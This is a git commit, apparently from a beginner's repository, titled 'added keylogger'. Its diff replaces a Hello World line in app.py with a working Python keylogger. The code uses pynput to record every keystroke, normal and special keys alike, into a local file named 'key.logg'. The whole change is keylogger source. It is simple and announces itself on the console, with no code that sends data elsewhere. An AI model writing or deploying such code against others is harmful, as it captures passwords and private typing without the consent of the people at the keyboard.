a3eb18e6dc4e9de6032f24616cbc6e83d2c2f8c2
mahiWritesLogic <rajmahi4225@gmail.com>
2025-04-11 22:41:50 +0530

    added keylogger

--- app.py
+++ app.py
@@ -1,1 +1,20 @@
-print ("Hello World")
+from pynput import keyboard
+
+# This is the name of the file where keys will be saved
+log_file = "key.logg"
+
+# Function to write the pressed key into the log file
+def on_press(key):
+    try:
+        # Try to get the character if it's a normal key
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Special keys (like shift, ctrl, etc.)
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
+
+# Start listening to keyboard
+with keyboard.Listener(on_press=on_press) as listener:
+    print("Keylogger is running... (press Ctrl+C to stop)")
+    listener.join()
